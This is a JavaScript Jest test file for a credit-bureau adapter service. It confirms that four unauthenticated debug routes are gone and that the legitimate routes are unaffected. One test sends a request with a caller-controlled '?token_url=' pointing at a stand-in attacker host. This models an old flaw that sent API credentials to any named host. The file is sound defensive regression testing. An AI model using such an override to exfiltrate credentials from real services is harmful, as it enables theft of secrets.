'use strict';

// Pins the removal of four unauthenticated debug routes that shipped to
// production on a bureau-facing service. They are gone, not gated: the safest
// version of a debug endpoint on this service is one that does not exist.
//
// What each one handed out with no credential at all:
//   /debug-routes       — the entire Express route table, including internal/*
//   /debug-connectivity — DNS, outbound IP, upstream probes, and (via the
//                         caller-controlled ?token_url= override) the
//                         SoftCredito API credentials sent to any host
//   /check-outbound-ip  — the live egress IP plus the hardcoded address the
//                         bureau allowlists
//   /routes-check       — a static copy of the route table
//
// If any of these comes back, this file fails.

const { setBaseEnv } = require('./testEnv');
setBaseEnv();

jest.mock('../lib/scToken', () => ({
  scTokenRaw: jest.fn().mockRejectedValue(new Error('scToken should not be called')),
}));
jest.mock('../lib/fetchClient', () => ({
  getFetch: jest.fn().mockRejectedValue(new Error('fetch should not be called')),
}));

const request = require('supertest');
const { app } = require('../index');
const admin = require('firebase-admin');

const SECRET = process.env.INTERNAL_SECRET;

beforeEach(() => {
  admin.__reset();
});

describe('the debug scaffolding is removed, not merely unauthenticated', () => {
  const REMOVED = [
    '/debug-routes',
    '/debug-connectivity',
    '/check-outbound-ip',
    '/routes-check',
  ];

  for (const path of REMOVED) {
    test(`GET ${path} — 404, with or without the internal secret`, async () => {
      const anon = await request(app).get(path);
      expect(anon.status).toBe(404);

      // Not gated behind the secret either -- the handler is gone outright.
      const authed = await request(app).get(path).set('x-internal-secret', SECRET);
      expect(authed.status).toBe(404);
    });
  }

  test('GET /debug-connectivity does not honour the ?token_url= override', async () => {
    // This query param made the route POST X-REST-PRODUCT / X-REST-APPLICATION
    // -- the SoftCredito API credentials -- to any host a caller named.
    const res = await request(app)
      .get('/debug-connectivity?token_url=https://attacker.example/collect');
    expect(res.status).toBe(404);
  });

  test('the bureau egress IP appears nowhere in the served route table', async () => {
    // 162.220.232.99 is the address SoftCredito allowlists. /check-outbound-ip
    // published it, and a match boolean confirming it, to anonymous callers.
    const routes = app._router.stack
      .filter((r) => r.route)
      .map((r) => r.route.path);

    expect(routes).toEqual(
      expect.arrayContaining(['/health', '/metrics', '/bureau/query', '/curp/validate'])
    );
    for (const path of REMOVED) {
      expect(routes).not.toContain(path);
    }
  });
});

describe('the legitimate surface is untouched', () => {
  test('GET /health still answers 200 unauthenticated', async () => {
    const res = await request(app).get('/health');
    expect(res.status).toBe(200);
    expect(res.body.service).toBe('vida-softcredito-adapter');
    expect(res.body.status).toBe('ok');
  });

  test('GET /metrics still answers 200 unauthenticated', async () => {
    const res = await request(app).get('/metrics');
    expect(res.status).toBe(200);
  });

  test('POST /bureau/query still 401s without the secret', async () => {
    const res = await request(app).post('/bureau/query').send({});
    expect(res.status).toBe(401);
    expect(res.body).toEqual({ error: 'Unauthorized' });
  });

  test('POST /bureau/query still gets past auth with the secret', async () => {
    const res = await request(app)
      .post('/bureau/query')
      .set('x-internal-secret', SECRET)
      .send({});
    // Missing fields -- 400 from the route's own validation, not 401.
    expect(res.status).toBe(400);
  });

  test('POST /internal/disburse still 401s without the secret', async () => {
    const res = await request(app).post('/internal/disburse').send({});
    expect(res.status).toBe(401);
  });
});
